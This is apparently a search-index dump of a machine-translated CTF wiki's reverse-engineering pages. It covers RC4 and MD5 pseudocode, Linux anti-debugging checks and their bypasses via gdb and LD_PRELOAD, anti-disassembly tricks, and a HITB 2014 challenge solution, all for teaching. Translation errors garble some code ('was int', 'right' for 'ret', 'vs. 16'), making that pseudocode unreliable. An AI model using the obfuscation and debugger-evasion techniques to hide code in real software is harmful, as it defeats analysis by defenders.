0 to 255 non-repeating elements into the S box. The second for loop scrambles the S box based on the key. for i from 0 to 255 S [ i ] := i endfor j : = 0 for ( i = 0 ; i < 256 ; i ++ ) j : = ( j + S [ i ] + key [ i mod keylength ]) % 256 swap values of S [ i ] and S [ j ] endfor Below i, j are two pointers. Each time a byte is received, a while loop is performed. An element in the S box is located by a certain algorithm ((a), (b)) and XORed with the input byte to obtain k. The S box (\u00a9) is also changed in the loop. If the input is [plain text] ( https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87 ), the output is [ciphertext] ( https://zh.wikipedia . Org/wiki/%E5%AF%86%E6%96%87); if the input is ciphertext, the output is plaintext. i : = 0 j : = 0 while GeneratingOutput : i : = ( i + 1 ) mod 256 //a j : = ( j + S [ i ]) mod 256 //b swap values of S [ i ] and S [ j ] //c k : = inputByte ^ S [( S [ i ] + S [ j ]) % 256 ] output K endwhile This algorithm guarantees that each element of the S box is exchanged at least once every 256 cycles.","title":"RC4"},{"location":"reverse/Identify-Encode-Encryption/introduction/#md5","text":"MD5 Message-Digest Algorithm , a widely used [cryptographic hash function] ( https://en.wikipedia.org/wiki/%E5%AF%86 %) E7%A2%BC%E9%9B%9C%E6%B9%8A%E5%87%BD%E6%95%B8), can produce a 128-bit (16 [bytes] ( https://zh . wikipedia.org/wiki/%E5%AD%97%E8%8A%82)) The hash value used to ensure complete and consistent information transfer. MD5 by American cryptographer [Ronald Levist] ( https://en.wikipedia.org/wiki/%E7%BD%97%E7%BA%B3%E5%BE%B7%C2%B7 % E6%9D%8E%E7%BB%B4%E6%96%AF%E7%89%B9) (Ronald Linn Rivest) designed to be published in 1992 to replace [MD4] ( https://en.wikipedia .org/wiki/MD4) algorithm. The program for this algorithm is specified in [RFC 1321] ( https://tools.ietf.org/html/rfc1321 ). The pseudo code is expressed as: /Note: All variables are unsigned 32 bits and wrap modulo 2^32 when calculating was int [64] r, k //r specifies the per-round shift amounts r[ 0..15]\uff1a= {7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22} r[16..31]\uff1a= {5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20} r[32..47]\uff1a= {4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23} r[48..63]\uff1a= {6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21} //Use binary integer part of the sines of integers as constants: for i from 0 to 63 k[i] := floor(abs(sin(i + 1)) \u00d7 2^32) //Initialize variables: was int h0: = 0x67452301 was int h1: = 0xEFCDAB89 was int h2: = 0x98BADCFE was int h3: = 0x10325476 //Pre-processing: append \"1\" bit to message append \"0\" bits until message length in bits \u2261 448 (mod 512) append bit length of message as 64-bit little-endian integer to message //Process the message in successive 512-bit chunks: for each 512-bit chunk of message break chunk into sixteen 32-bit little-endian words w[i], 0 \u2264 i \u2264 15 //Initialize hash value for this chunk: var int a: = h0 was int b: = h1 was int c: = h2 var int d: = h3 //Main loop: for i from 0 to 63 if 0 \u2264 i \u2264 15 then f := (b and c) or ((not b) and d) g: = i else if 16 \u2264 i \u2264 31 f := (d and b) or ((not d) and c) g: = (5 \u00d7 i + 1) vs. 16 else if 32 \u2264 i \u2264 47 f := b xor c xor d g: = (3 \u00d7 i + 5) vs. 16 else if 48 \u2264 i \u2264 63 f := c xor (b or (not d)) g: = (7 \u00d7 i) vs. 16 temp := d d := c c := b b := leftrotate((a + f + k[i] + w[g]),r[i]) + b a := temp Next i //Add this chunk's hash to result so far: h0 := h0 + a h1: = h1 + b h2 := h2 + c h3 := h3 + d End ForEach var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian) Its distinctive features are: h0 = 0x67452301 ; h1 = 0xefcdab89 ; h2 = 0x98badcfe ; h3 = 0x10325476 ;","title":"MD5"},{"location":"reverse/linux/detect-bp/","text":"Gdb implements a breakpoint by replacing the byte of the destination address with 0xcc . Here is a simple example of detecting the int 3 breakpoint: void foo () { printf ( \"Hello \\n \" ); } int main () { if (( * ( volatile unsigned * )(( unsigned ) foo ) & 0xff ) == 0xcc ) { printf ( \"BREAKPOINT \\n \" ); exit ( 1 ); } foo (); } The normal running program will output Hello, but if you set the cc breakpoint and run it in the foo function, gdb will not be able to break, and will output BREAKPOINT . # gdb ./x gdb> bp foo Breakpoint 1 at 0x804838c gdb> run BREAKPOINT Program exited with code 01. This is also very simple to bypass, that is, you need to read the assembly code and pay attention to set the breakpoint not at the entrance of the foo function. The actual situation depends on where the detection breakpoint is. The key to this anti-debugging technique for monitoring breakpoints is not how to bypass it, but how to detect it. In this example, it is easy to find that the program also prints out the corresponding information. In actual situations, the program does not Any information will be output, and the breakpoint will not be easily broken. We can use the perl script to filter the code for the 0xcc in the disassembly code for checking. We can use the perl script to filter the 0xcc code in the disassembly code for checking. #!/usr/bin/perl while ( <> ) { if ( $_ =~ m/([0-9a-f][4]:\\s*[0-9a-f \\t]*.*0xcc)/ ){ print ; } } show result # objdump -M intel -d xxx | ./antibp.pl 80483be: 3d cc 00 00 00 cmp eax,0xcc After detection, you can either change 0xcc to 0x00 or 0x90, or do whatever you want. Changing 0xcc can also cause problems. As mentioned in the previous article, if the program has file verification, then our changes will be detected. If possible, the program does not only detect the function entry point. The entire function is also tested in a loop. So you can also manually place an ICEBP(0xF1) byte into the location you want to break (not int 3 ) with a hex editor. Because ICEBP also breaks gdb. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"Detecting Breakpoints Bypassing"},{"location":"reverse/linux/detect-dbg/","text":"There are many ways to detect the debugger, such as detecting the process name. Here we introduce a method to detect whether the program is currently being debugged by detecting the call of some functions. int main () { if ( ptrace ( PTRACE_TRACEME , 0 , 1 , 0 ) < 0 ) { printf ( \"DEBUGGING... Bye \\n \" ); return 1 ; } printf ( \"Hello \\n \" ); return 0 ; } A process can only be ptrace by a process. If you call ptrace yourself, other programs cannot debug through ptrace or inject code into your program. If the program is currently being debugged by gdb, the ptrace function will return an error, which indicates that the debugger is detected. Bypass Method 1 \u00b6 Obviously ptrace can only be used with debuggers that use ptrace, we can use debuggers that don't use ptrace. We can also erase the ptrace function by patching. The simpler is to erase the ptrace call code or the subsequent checksum. If the executable (which is unlikely in the real world) does not have the -s option enabled at compile time (the -s option removes all symbol table information and relocation information), then the situation becomes much simpler. We are from this Simple situation to analyze # objdump -t test_debug | grep ptrace 080482c0 F *UND* 00000075 ptrace@@GLIBC_2.0 Ptrace is called at 0x080482c0 # objdump -d -M intel test_debug |grep 80482c0 80482c0: ff 25 04 96 04 08 jmp ds:0x8049604 80483d4: e8 e7 fe ff ff call 80482c0 <_init+0x28> If there is the -s option enabled, what should I do? At this point we need to use gdb # gdb test_debug gdb> bp ptrace Breakpoint 1 at 0x80482c0 gdb> run Breakpoint 1 at 0x400e02f0 ...... 0x400e02f0 <ptrace>: push %ebp 0x400e02f1 <ptrace+1>: mov %esp,%ebp 0x400e02f3 <ptrace+3>: sub $0x10,%esp 0x400e02f6 <ptrace+6>: mov %edi,0xfffffffc(%ebp) 0x400e02f9 <ptrace+9>: mov 0x8(%ebp),%edi 0x400e02fc <ptrace+12> : move 0xc (% ebp),% ecx ------------------------------------------------------------------------------ Breakpoint 1, 0x400e02f0 in ptrace () from /lib/tls/libc.so.6 We simply broke at ptrace, now enter finish to return to the current function, back to the main function # gdb test_debug gdb> finish 00x80483d9 <main+29>: add $0x10,%esp 0x80483dc <main+32>: test %eax,%eax 0x80483de <main+34> : Jus 0x80483fa <main+62> 0x80483e0 <main+36>: sub $0xc,%esp 0x80483e3 <main+39>: push $0x80484e8 0x80483e8 <main+44>: call 0x80482e0 ------------------------------------------------------------------------------ 0x080483d9 in main () Modify the function return result eax to the correct return result, you can gdb> set $eax=0 gdb&gt; c everything ok Program exited with code 016. _______________________________________________________________________________ No registers. gdb> Bypass Method 2 \u00b6 Method 2 is to write your own ptrace function As mentioned in the previous sections, the LD_PRELOAD environment variable can point the executable to our own ptrace function. We write a ptrace function and generate the target file // -- ptrace.c -- // gcc -shared ptrace.c -o ptrace.so int ptrace ( int i , int j , int k , int l ) { printf ( \" PTRACE CALLED! \\n \" ); } We can then use our own ptrace function by setting the environment variable LD_PRELOAD, which can be set in gdb. gdb> set environment LD_PRELOAD ./ptrace.so gdb> run PTRACE CALLED! Hello World! Program exited with code 015. gdb> You can see that the program can't detect the debugger. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"Detecting Debugging Bypassing"},{"location":"reverse/linux/detect-dbg/#bypass-method-1","text":"Obviously ptrace can only be used with debuggers that use ptrace, we can use debuggers that don't use ptrace. We can also erase the ptrace function by patching. The simpler is to erase the ptrace call code or the subsequent checksum. If the executable (which is unlikely in the real world) does not have the -s option enabled at compile time (the -s option removes all symbol table information and relocation information), then the situation becomes much simpler. We are from this Simple situation to analyze # objdump -t test_debug | grep ptrace 080482c0 F *UND* 00000075 ptrace@@GLIBC_2.0 Ptrace is called at 0x080482c0 # objdump -d -M intel test_debug |grep 80482c0 80482c0: ff 25 04 96 04 08 jmp ds:0x8049604 80483d4: e8 e7 fe ff ff call 80482c0 <_init+0x28> If there is the -s option enabled, what should I do? At this point we need to use gdb # gdb test_debug gdb> bp ptrace Breakpoint 1 at 0x80482c0 gdb> run Breakpoint 1 at 0x400e02f0 ...... 0x400e02f0 <ptrace>: push %ebp 0x400e02f1 <ptrace+1>: mov %esp,%ebp 0x400e02f3 <ptrace+3>: sub $0x10,%esp 0x400e02f6 <ptrace+6>: mov %edi,0xfffffffc(%ebp) 0x400e02f9 <ptrace+9>: mov 0x8(%ebp),%edi 0x400e02fc <ptrace+12> : move 0xc (% ebp),% ecx ------------------------------------------------------------------------------ Breakpoint 1, 0x400e02f0 in ptrace () from /lib/tls/libc.so.6 We simply broke at ptrace, now enter finish to return to the current function, back to the main function # gdb test_debug gdb> finish 00x80483d9 <main+29>: add $0x10,%esp 0x80483dc <main+32>: test %eax,%eax 0x80483de <main+34> : Jus 0x80483fa <main+62> 0x80483e0 <main+36>: sub $0xc,%esp 0x80483e3 <main+39>: push $0x80484e8 0x80483e8 <main+44>: call 0x80482e0 ------------------------------------------------------------------------------ 0x080483d9 in main () Modify the function return result eax to the correct return result, you can gdb> set $eax=0 gdb&gt; c everything ok Program exited with code 016. _______________________________________________________________________________ No registers. gdb>","title":"Bypass Method 1"},{"location":"reverse/linux/detect-dbg/#bypass-method-2","text":"Method 2 is to write your own ptrace function As mentioned in the previous sections, the LD_PRELOAD environment variable can point the executable to our own ptrace function. We write a ptrace function and generate the target file // -- ptrace.c -- // gcc -shared ptrace.c -o ptrace.so int ptrace ( int i , int j , int k , int l ) { printf ( \" PTRACE CALLED! \\n \" ); } We can then use our own ptrace function by setting the environment variable LD_PRELOAD, which can be set in gdb. gdb> set environment LD_PRELOAD ./ptrace.so gdb> run PTRACE CALLED! Hello World! Program exited with code 015. gdb> You can see that the program can't detect the debugger. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"Bypass Method 2"},{"location":"reverse/linux/false-disasm/","text":"For some common disassemblers, such as objdump , or disassembler projects based on objdump , there are some disassembly flaws. There are ways to make objdump disassemble the code, not so Accurate. Jump to the middle of an instruction \u00b6 The easiest way is to use jmp to jump to the middle of an instruction, that is, the real code starts from \"inside\" an instruction, but in disassembly it cannot be listed for the entire instruction. The actual assembly instruction code that is being run. It sounds like a mouthful, it's hard to understand, let's look at an example, give the following assembly code. start: jmp label+1 label: DB 0x90 mov eax, 0xf001 The first instruction in the code label is DB 0x90 . Let's take a look at the result of disassembly of this code by objdump : 08048080 <start>: 8048080: e9 01 00 00 00 jmp 8048086 <label+0x1> 08048085 <label>: 8048085: 90 nop 8048086: b8 01 f0 00 00 mov eax,0xf001 It seems that there is no problem, DB 0x90 is accurately disassembled into 90 nop . But if we change the nop instruction to a command of more than 1 byte, then objdump will not follow our jump and correctly disassemble, but linearly continue to assemble from top to bottom (linear scan algorithm). For example, I Change DB 0x90 to DB 0xE9 to see the result of objdump disassembling again: 08048080 <start>: 8048080: e9 01 00 00 00 jmp 8048086 <label+0x1> 08048085 <label>: 8048085: e9 b8 01 f0 00 jmp 8f48242 <__bss_start+0xeff1b6> Compared with the previous disassembly results, you can clearly see what is going on. DB 0xE9 is just a piece of data, it will not be executed, but the result of disassembly will be treated as an instruction. The result has also changed. Objdump` ignores the code at the destination address of jmp and directly assembles the instructions after jmp, so that our real code is well \"hidden\" Solution \u00b6 How to solve this problem? The most straightforward way is to manually replace this useless 0xE9 with a hex editor with 0x90 . But if the program has file checksum, calculate the checksum value, then this The method will not work. So a better solution is to use a disassembler such as IDA or similar control flow analysis, for programs that are also problematic. The disassembly results might look like this: ---- section .text ----: 08048080 E9 01 00 00 00 jmp Label_08048086 ; (08048086) ; (near + 0x1) 08048085 DB E9 Label_08048086: 08048086 B8 01 F0 00 00 mov eax, 0xF001 ; xref ( 08048080 ) Disassembly results look okay Run time calculation jump address \u00b6 This method can even counter the disassembler of the analysis control flow. We can look at a sample code to better understand: ; ---------------------------------------------------------------------------- call earth+1 Return: ; x instructions or random bytes here x byte(s) earth: ; earth = Return + x xor eax, eax ; align disassembly, using single byte opcode 1 byte pop eax ; start of function: get return address ( Return ) 1 byte ; y instructions or random bytes here y byte(s) add eax, x+2+y+2+1+1+z ; x+y+z+6 2 bytes push eax ; 1 byte right ; 1 byte ; z instructions or random bytes here z byte(s) ; Code: ; !! Code Continues Here !! ; ---------------------------------------------------------------------------- The program uses call+pop to get the return address that the calling function saved to the stack at the time. It is actually the EIP before the function is called. Then the garbage data is stuffed at the function return. But it will actually return when the function is running. The address is modified to Code. So the earth function returns to jump to Code and continues to run, instead of Return . Look at a simple demo ; ---------------------------------------------------------------------------- call earth+1 earth: DB 0xE9 ; 1 <--- pushed return address, ; E9 is opcode for jmp to disalign disas- ; sembly pop eax ; 1 hidden NOP ; first add eax, 9 ; 2 hidden push eax ; 1 hidden right ; 1 hidden DB 0xE9 ; 1 opcode for jmp to misalign disassembly Code: ; code continues here <--- pushed return address + 9 NOP NOP NOP right ; ---------------------------------------------------------------------------- If you use objdump for disassembly, there will be problems with call earth+1 , as follows: 00000000 <earth-0x5>: 0: e8 01 00 00 00 call 6 <earth+0x1> 00000005 <earth>: 5: e9 58 90 05 09 jmp 9059062 <earth+0x905905d> a: 00 00 add% al, (% eax) c: 00 50 c3 add %dl,0xffffffc3(%eax) f: e9 90 90 90 c3 jmp c39090a4 <earth+0xc390909f> Let's take a look at the case of ida text:08000000 ; Segment permissions: Read/Execute .text:08000000 _text segment para public 'CODE' use32 .text:08000000 assume cs:_text .text:08000000 ;org 8000000h .text:08000000 assume es:nothing, ss:nothing, ds:_text, .text:08000000 fs:nothing, gs:nothing .text:08000000 dd 1E8h .text:08000004 ; ------------------------------------------------------------- .text:08000004 add cl, ch .text:08000006 pop eax .text: 08000007 nop .text:08000008 add eax, 9 .text:0800000D push eax .text: 0800000E retn .text:0800000E ; ------------------------------------------------------------- .text:0800000F dd 909090E9h .text:08000013 ; ------------------------------------------------------------- .text: 08000013 retn .text:08000013 _text ends .text:08000013 .text:08000013 .text:08000013 end We are very well hidden in the last three nop . Not only that, but our process of calculating EIP is also perfectly hidden. In fact, the entire disassembled code is completely different from the actual code. How to solve this problem? There is actually no tool that can guarantee '100%' accurate disassembly. When the disassembler does code simulation, it may be able to do the correct assembly. In reality, this is not a particularly big problem. Because it is for the interactive disassembler. You can specify the starting position of the code. And when debugging, you can also see the address of the actual jump of the program. So at this point we need static analysis, but also need dynamic debugging. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"Incorrect Disassembly Fix"},{"location":"reverse/linux/false-disasm/#jump-to-the-middle-of-an-instruction","text":"The easiest way is to use jmp to jump to the middle of an instruction, that is, the real code starts from \"inside\" an instruction, but in disassembly it cannot be listed for the entire instruction. The actual assembly instruction code that is being run. It sounds like a mouthful, it's hard to understand, let's look at an example, give the following assembly code. start: jmp label+1 label: DB 0x90 mov eax, 0xf001 The first instruction in the code label is DB 0x90 . Let's take a look at the result of disassembly of this code by objdump : 08048080 <start>: 8048080: e9 01 00 00 00 jmp 8048086 <label+0x1> 08048085 <label>: 8048085: 90 nop 8048086: b8 01 f0 00 00 mov eax,0xf001 It seems that there is no problem, DB 0x90 is accurately disassembled into 90 nop . But if we change the nop instruction to a command of more than 1 byte, then objdump will not follow our jump and correctly disassemble, but linearly continue to assemble from top to bottom (linear scan algorithm). For example, I Change DB 0x90 to DB 0xE9 to see the result of objdump disassembling again: 08048080 <start>: 8048080: e9 01 00 00 00 jmp 8048086 <label+0x1> 08048085 <label>: 8048085: e9 b8 01 f0 00 jmp 8f48242 <__bss_start+0xeff1b6> Compared with the previous disassembly results, you can clearly see what is going on. DB 0xE9 is just a piece of data, it will not be executed, but the result of disassembly will be treated as an instruction. The result has also changed. Objdump` ignores the code at the destination address of jmp and directly assembles the instructions after jmp, so that our real code is well \"hidden\"","title":"Jump to the middle of an instruction"},{"location":"reverse/linux/false-disasm/#solution","text":"How to solve this problem? The most straightforward way is to manually replace this useless 0xE9 with a hex editor with 0x90 . But if the program has file checksum, calculate the checksum value, then this The method will not work. So a better solution is to use a disassembler such as IDA or similar control flow analysis, for programs that are also problematic. The disassembly results might look like this: ---- section .text ----: 08048080 E9 01 00 00 00 jmp Label_08048086 ; (08048086) ; (near + 0x1) 08048085 DB E9 Label_08048086: 08048086 B8 01 F0 00 00 mov eax, 0xF001 ; xref ( 08048080 ) Disassembly results look okay","title":"Solution"},{"location":"reverse/linux/false-disasm/#run-time-calculation-jump-address","text":"This method can even counter the disassembler of the analysis control flow. We can look at a sample code to better understand: ; ---------------------------------------------------------------------------- call earth+1 Return: ; x instructions or random bytes here x byte(s) earth: ; earth = Return + x xor eax, eax ; align disassembly, using single byte opcode 1 byte pop eax ; start of function: get return address ( Return ) 1 byte ; y instructions or random bytes here y byte(s) add eax, x+2+y+2+1+1+z ; x+y+z+6 2 bytes push eax ; 1 byte right ; 1 byte ; z instructions or random bytes here z byte(s) ; Code: ; !! Code Continues Here !! ; ---------------------------------------------------------------------------- The program uses call+pop to get the return address that the calling function saved to the stack at the time. It is actually the EIP before the function is called. Then the garbage data is stuffed at the function return. But it will actually return when the function is running. The address is modified to Code. So the earth function returns to jump to Code and continues to run, instead of Return . Look at a simple demo ; ---------------------------------------------------------------------------- call earth+1 earth: DB 0xE9 ; 1 <--- pushed return address, ; E9 is opcode for jmp to disalign disas- ; sembly pop eax ; 1 hidden NOP ; first add eax, 9 ; 2 hidden push eax ; 1 hidden right ; 1 hidden DB 0xE9 ; 1 opcode for jmp to misalign disassembly Code: ; code continues here <--- pushed return address + 9 NOP NOP NOP right ; ---------------------------------------------------------------------------- If you use objdump for disassembly, there will be problems with call earth+1 , as follows: 00000000 <earth-0x5>: 0: e8 01 00 00 00 call 6 <earth+0x1> 00000005 <earth>: 5: e9 58 90 05 09 jmp 9059062 <earth+0x905905d> a: 00 00 add% al, (% eax) c: 00 50 c3 add %dl,0xffffffc3(%eax) f: e9 90 90 90 c3 jmp c39090a4 <earth+0xc390909f> Let's take a look at the case of ida text:08000000 ; Segment permissions: Read/Execute .text:08000000 _text segment para public 'CODE' use32 .text:08000000 assume cs:_text .text:08000000 ;org 8000000h .text:08000000 assume es:nothing, ss:nothing, ds:_text, .text:08000000 fs:nothing, gs:nothing .text:08000000 dd 1E8h .text:08000004 ; ------------------------------------------------------------- .text:08000004 add cl, ch .text:08000006 pop eax .text: 08000007 nop .text:08000008 add eax, 9 .text:0800000D push eax .text: 0800000E retn .text:0800000E ; ------------------------------------------------------------- .text:0800000F dd 909090E9h .text:08000013 ; ------------------------------------------------------------- .text: 08000013 retn .text:08000013 _text ends .text:08000013 .text:08000013 .text:08000013 end We are very well hidden in the last three nop . Not only that, but our process of calculating EIP is also perfectly hidden. In fact, the entire disassembled code is completely different from the actual code. How to solve this problem? There is actually no tool that can guarantee '100%' accurate disassembly. When the disassembler does code simulation, it may be able to do the correct assembly. In reality, this is not a particularly big problem. Because it is for the interactive disassembler. You can specify the starting position of the code. And when debugging, you can also see the address of the actual jump of the program. So at this point we need static analysis, but also need dynamic debugging. Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques","title":"Run time calculation jump address"},{"location":"reverse/linux/ld_preload/","text":"Principle \u00b6 Under normal circumstances, Linux dynamic loader ld-linux (see man page ld-linux (8)) will search and load the shared link library file required by the program, and LD_PRELOAD is an optional environment variable, including One or more paths to the shared link library file. The loader will load the shared link library specified by LD_PRELOAD before the C language runtime, which is called preloading ( preload ). Preloading means that its functions will be called before the function of the same name in other library files, so that the library functions can be blocked or replaced. The path of multiple shared link library files can be colon or space. To distinguish. Obviously not affected by LD_PRELOAD , only those statically linked programs. Of course, to avoid malicious attacks, the loader will not be preloaded with LD_PRELOAD in the case of ruid != euid . Read more: https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4 Example \u00b6 Let's take the 2014 Hack In The Box Amsterdam: Bin 100 as an example. Download the topic: hitb_bin100.elf This is a 64-bit ELF file. The results are shown below: The program seems to be printing some sentences all the time. And there are no signs of stopping. Let's open it with IDA. First press Shift+F12 to find the string. Obviously, apart from the sentences that have been printed, we found some interesting strings: .rodata:0000000000400A53 00000006 C KEY: .rodata:0000000000400A5F 0000001F C OK YOU WIN. HERE'S YOUR FLAG: We came to the key code according to the cross-reference of OK YOU WIN. HERE&#39;S YOUR FLAG: (I deleted some unnecessary code). int __cdecl main ( int argc , const char ** argv , const char ** envp ) { qmemcpy ( v23 , & unk_400A7E , sizeof ( v23 )); v3 = v22 ; for ( i = 9L L ; i ; -- i ) { * ( _DWORD * ) v3 = 0 ; v3 + = 4 ; } v20 = 0x31337 ; v21 = time ( 0L L ); do { v11 = 0L L ; do { v5 = 0L L ; v6 = time ( 0L L ); Srand ( 233811181 - v21 + v6 ); // Initialize the random number seed v7 = v22 [ v11 ]; V22 [ v11 ] = rand () ^ v7 ; // pseudo-random number v8 = ( & funny )[ 8 * v11 ]; while ( v5 < strlen ( v8 ) ) { v9 = v8 [ v5 ]; if ( ( _BYTE ) v9 == 105 ) { v24 [( signed int ) v5 ] = 105 ; } else { if ( ( _DWORD ) v5 && v8 [ v5 - 1 ] != 32 ) V10 = __ctype_toupper_loc (); // uppercase else V10 = __ctype_tolower_loc (); // lowercase v24 [( signed int ) v5 ] = ( * v10 )[ v9 ]; } ++ v5 ; } v24 [( signed int ) v5 ] = 0 ; ++ v11 ; __printf_chk ( 1L L , & quot ; Uranium % 80 s uranium \u7395 n & quot ;, v24 ); // garbled is actually a note sleep ( 1u ); } while ( v11 != 36 ); -- v20 ; } while ( v20 ); V13 = v22 ; // key is stored in the v22 array __printf_chk ( 1L L , \"KEY: \" , v12 ); do { v14 = ( unsigned __int8 ) * v13 ++ ; __printf_chk ( 1L L , & quot ; % 02 x & quot ;, v14 ); // output key } while ( v13 != v23 ); v15 = 0L L ; putchar ( 10 ); __printf_chk ( 1L L , \"OK YOU WIN. HERE'S YOUR FLAG: \" , v16 ); do { V17 = v23 [ v15 ] ^ v22 [ v15 ]; // XOR with the value of key ++ v15 ; Putchar ( v17 ); // output flag } while ( v15 != 36 ); Putchar ( 10 ); // output line break result = 0 ; return result ; } The whole code flow is mainly to continuously output the sentences in funny , output the key after satisfying the loop condition, and XOR the flag to get the value of flag . But we can see that the number of times the whole loop is relatively small. So we can use some methods to make the loop faster. For example, I manually patch it, not let the program output the string (actually printf The time consumption is quite a lot.) The second is to use LD_PRELOAD to make the program's sleep() invalid. It can obviously save time. The process of manual patching is relatively simple. We can find the code location and then modify it with some hex editors. Of course, we can also use IDA to do patch work. ` asm .text:00000000004007B7 call ___printf_chk .text:00000000004007BC xor eax, eax Point the cursor on `call ___printf_chk`, then select the menu `Edit-&gt;Patch Program-&gt;Assemble` (of course you can use other patch methods. The effect is the same). Then modify it to `nop(0x90)`, as follows Figure ![ida_patch.png](./figure/2014_hitb/ida_patch.png) Modify the assembly code between `4007B7` and `4007BD` to `nop`. Then select the menu `Edit-&gt;Patch Program-&gt;Apply patches to input file`. Of course, it is best to make a backup (ie check) `Create a backup`), then click OK (I renamed to `patched.elf`, download link: [patched.elf](https://github.com/ctf-wiki/ctf-challenges/blob/ Master/reverse/linux-re/2014_hitb/patched.elf)). ![ida_apply.png](./figure/2014_hitb/ida_apply.png) Now go to the `LD_PRELOAD` section. Here we simply write the c code, download link: [time.c](https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/linux-re/ 2014_hitb/time.c) ``` c static int t = 0x31337; void sleep(int sec) { t += sec; } int time() { return t; } Then use the command gcc --shared time.c -o time.so to generate the dynamic link file. Of course, the download link is also given: time.so Then open the linux terminal and run the command: LD_PRELOAD=./time.so ./patched.elf After a while, you can hear the sound of the CPU running wildly, and then the flag will come out soon.","title":"LD_PRELOAD"},{"location":"reverse/linux/ld_preload/#principle","text":"Under normal circumstances, Linux dynamic loader ld-linux (see man page ld-linux (8)) will search and load the shared link library file required by the program, and LD_PRELOAD is an optional environment variable, including One or more paths to the shared link library file. The loader will load the shared link library specified by LD_PRELOAD before the C language runtime, which is called preloading ( preload ). Preloading means that its functions will be called before the function of the same name in other library files, so that the library functions can be blocked or replaced. The path of multiple shared link library files can be colon or space. To distinguish. Obviously not affected by LD_PRELOAD , only those statically linked programs. Of course, to avoid malicious attacks, the loader will not be preloaded with LD_PRELOAD in the case of ruid != euid . Read more: https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html#ixzz569cbyze4","title":"Principle"},{"location":"reverse/linux/ld_preload/#example","text":"Let's take the 2014 Hack In The Box Amsterdam: Bin 100 as an example. Download the topic: hitb_bin100.elf This is a 64-bit ELF file. The results are shown below: The program seems to be printing some sentences all the time. And there are no signs of stopping. Let's open it with IDA. First press Shift+F12 to find the string. Obviously, apart from the sentences that have been printed, we found some interesting strings: .rodata:0000000000400A53 00000006 C KEY: .rodata:0000000000400A5F 0000001F C OK YOU WIN. HERE'S YOUR FLAG: We came to the key code according to the cross-reference of OK YOU WIN. HERE&#39;S YOUR FLAG: (I deleted some unnecessary code). int __cdecl main ( int argc , const char ** argv , const char ** envp ) { qmemcpy ( v23 , & unk_400A7E , sizeof ( v23 )); v3 = v22 ; for ( i = 9L L ; i ; -- i ) { * ( _DWORD * ) v3 = 0 ; v3 + = 4 ; } v20 = 0x31337 ; v21 = time ( 0L L ); do { v11 = 0L L ; do { v5 = 0L L ; v6 = time ( 0L L ); Srand ( 233811181 - v21 + v6 ); // Initialize the random number seed v7 = v22 [ v11 ]; V22 [ v11 ] = rand () ^ v7 ; // pseudo-random number v8 = ( & funny )[ 8 * v11 ]; while ( v5 < strlen ( v8 ) ) { v9 = v8 [ v5 ]; if ( ( _BYTE ) v9 == 105 ) { v24 [( signed int ) v5 ] = 105 ; } else { if ( ( _DWORD ) v5 && v8 [ v5 - 1 ] != 32 ) V10 = __ctype_toupper_loc (); // uppercase else V10 = __ctype_tolower_loc (); // lowercase v24 [( signed int ) v5 ] = ( * v10 )[ v9 ]; } ++ v5 ; } v24 [( signed int ) v5 ] = 0 ; ++ v11 ; __printf_chk ( 1L L , & quot ; Uranium % 80 s uranium \u7395 n & quot ;, v24 ); // garbled is actually a note sleep ( 1u ); } while ( v11 != 36 ); -- v20 ; } while ( v20 ); V13 = v22 ; // key is stored in the v22 array __printf_chk ( 1L L , \"KEY: \" , v12 ); do { v14 = ( unsigned __int8 ) * v13 ++ ; __printf_chk ( 1L L , & quot ; % 02 x & quot ;, v14 ); // output key } while ( v13 != v23 ); v15 = 0L L ; putchar ( 10 ); __printf_chk ( 1L L , \"OK YOU WIN. HERE'S YOUR FLAG: \" , v16 ); do { V17 = v23 [ v15 ] ^ v22 [ v15 ]; // XOR with the value of key ++ v15 ; Putchar ( v17 ); // output flag } while ( v15 != 36 ); Putchar ( 10 ); // output line break result = 0 ; return result ; } The whole code flow is mainly to continuously output the sentences in funny , output the key after satisfying the loop condition, and XOR the flag to get the value of flag . But we can see that the number of times the whole loop is relatively small. So we can use some methods to make the loop faster. For example, I manually patch it, not let the program output the string (actually printf The time consumption is quite a lot.) The second is to use LD_PRELOAD to make the program's sleep() invalid. It can obviously save time. The process of manual patching is relatively simple. We can find the code location and then modify it with some hex editors. Of course, we can also use IDA to do patch work. ` asm .text:00000000004007B7 call ___printf_chk .text:00000000004007BC xor eax, eax Point the cursor on `call ___printf_chk`, then select the menu `Edit-&gt;Patch Program-&gt;Assemble` (of course you can use other patch methods. The effect is the same). Then modify it to `nop(0x90)`, as follows Figure ![ida_patch.png](./figure/2014_hitb/ida_patch.png) Modify the assembly code between `4007B7` and `4007BD` to `nop`. Then select the menu `Edit-&gt;Patch Program-&gt;Apply patches to input file`. Of course, it is best to make a backup (ie check) `Create a backup`), then click OK (I renamed to `patched.elf`, download link: [patched.elf](https://github.com/ctf-wiki/ctf-challenges/blob/ Master/reverse/linux-re/2014_hitb/patched.elf)). ![ida_apply.png](./figure/2014_hitb/ida_apply.png) Now go to the `LD_PRELOAD` section. Here we simply write the c code, download link: [time.c](https://github.com/ctf-wiki/ctf-challenges/blob/master/reverse/linux-re/ 2014_hitb/time.c) ``` c static int t = 0x31337; void sleep(int sec) { t += sec; } int time() { return t; } Then use the command gcc --shared time.c -o time.so to generate the dynamic link file. Of course, the download link is also given: time.so Then open the linux terminal and run the command: LD_PRELOAD=./time.so ./patched.elf After a while, you can hear the sound of the CPU running wildly, and then the flag will come out soon.","title":"Example"},{"location":"reverse/maze/maze/","text":"Maze problem \u00b6 The maze problem has the following characteristics: Place a \"map\" in memory Limit user input to a few characters. Generally only one labyrinth entrance and one labyrinth exit The laid map can be composed of displayable characters (such as # and * ) 